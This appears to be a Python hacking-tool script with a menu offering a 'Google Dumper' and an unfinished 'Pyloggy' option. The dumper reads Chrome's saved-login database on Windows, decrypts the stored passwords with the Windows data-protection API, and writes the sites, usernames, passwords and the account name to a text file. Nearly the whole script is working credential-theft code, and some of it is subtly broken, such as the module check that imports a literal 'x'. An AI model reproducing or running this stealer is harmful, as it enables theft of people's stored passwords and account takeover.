#------------------------------------IMPORTS------------------------------------#
import urllib.request
import time
import pip
import subprocess
import sys
import os
import sqlite3
import getpass
import json
import win32crypt
import requests

#------------------------------------VALUES------------------------------------#

requiredmodules = {'pypiwin32','requests'}

urltocheckwifi = "https://www.google.com/"

clear = lambda: os.system('cls')

#------------------------------------FUNCTIONS------------------------------------#

#-------------------Show Selection Page-------------------#
def show_selection():
   clear()

   print(f"""
      ░██╗░░░░░░░██╗███████╗██╗░░░░░░█████╗░░█████╗░███╗░░░███╗███████╗
      ░██║░░██╗░░██║██╔════╝██║░░░░░██╔══██╗██╔══██╗████╗░████║██╔════╝
      ░╚██╗████╗██╔╝█████╗░░██║░░░░░██║░░╚═╝██║░░██║██╔████╔██║█████╗░░
      ░░████╔═████║░██╔══╝░░██║░░░░░██║░░██╗██║░░██║██║╚██╔╝██║██╔══╝░░
      ░░╚██╔╝░╚██╔╝░███████╗███████╗╚█████╔╝╚█████╔╝██║░╚═╝░██║███████╗
      ░░░╚═╝░░░╚═╝░░╚══════╝╚══════╝░╚════╝░░╚════╝░╚═╝░░░░░╚═╝╚══════╝
      """)

   print(f"""
      -1- Google Dumper
      -2- Pyloggy
      """)

   inputentered(input(""))

#-------------------Google Dump-------------------#

def GOOGLE_getpasswords():
   dataToBeSent = {}
   dataList = []
   path = GOOGLE_getpath()
   try:
      connection = sqlite3.connect(path + "Login Data")
      cursor = connection.cursor()
      v = cursor.execute(
         'SELECT action_url, username_value, password_value FROM logins')
      value = v.fetchall()

      for origin_url, username, password in value:
         password = win32crypt.CryptUnprotectData(
            password, None, None, None, 0)[1]

         if password:
            dataList.append({
               'origin_url': origin_url,
               'username': username,
               'password': str(password)[2:-1]
            })

   except sqlite3.OperationalError as e:
      e = str(e)
      if (e == 'database is locked'):
         print('[!] Make sure Google Chrome is not running in the background')
      elif (e == 'no such table: logins'):
         print('[!] Something wrong with the database name')
      elif (e == 'unable to open database file'):
         print('[!] Something wrong with the database path')
      else:
         print(e)

   dataToBeSent["user"] = getpass.getuser()
   dataToBeSent["passwords"] = dataList
   return dataToBeSent


def GOOGLE_getpath():
   PathName = os.getenv('localappdata') + \
              '\\Google\\Chrome\\User Data\\Default\\'
   if not os.path.isdir(PathName):
      print('[!] Chrome Doesn\'t exists')
      sys.exit(0)

   return PathName

def GOOGLE_dump():
   clear()
   jsonData = GOOGLE_getpasswords()
   credsString = json.dumps(jsonData)
   file = open("Gdump.txt", "w")
   file.write(credsString)
   file.close()
   print(credsString)
   print("[!] Txt saved in directory of script [!]")
   input("Press Enter to return to start")
   show_selection()

#-------------------PyLoggy Installer-------------------#

def pyloggy():
   clear()
   print("[?] wip [?]")
   input("Press Enter to return to start")
   show_selection()

#-------------------Pip Installer-------------------#

def pipinstall(package):
   subprocess.check_call([sys.executable, "-m", "pip", "install", package])


#-------------------Internet checker-------------------#
def check_internet_connection():
   try:
       urllib.request.urlopen("https://www.google.com/")
       return True
   except urllib.error.URLError:
       return False

#-------------------Prequisits checker-------------------#
def prequisits():
   for x in requiredmodules:
      try:
         import x
         print("\033[2J\033[H", end="", flush=True)
      except ImportError:
         pipinstall(x)


#Load Selection
def inputentered(entered):
   if entered == "1":
      GOOGLE_dump()
   if entered == "2":
      pyloggy()

#------------------------------------START------------------------------------#

#check internet
try:
   urllib.request.urlopen(urltocheckwifi)
   prequisits()
   show_selection()

except urllib.error.URLError:

   print("""
   █▄░█ █▀█   █ █▄░█ ▀█▀ █▀▀ █▀█ █▄░█ █▀▀ ▀█▀
   █░▀█ █▄█   █ █░▀█ ░█░ ██▄ █▀▄ █░▀█ ██▄ ░█░
   """)
   time.sleep(5)
   exit()
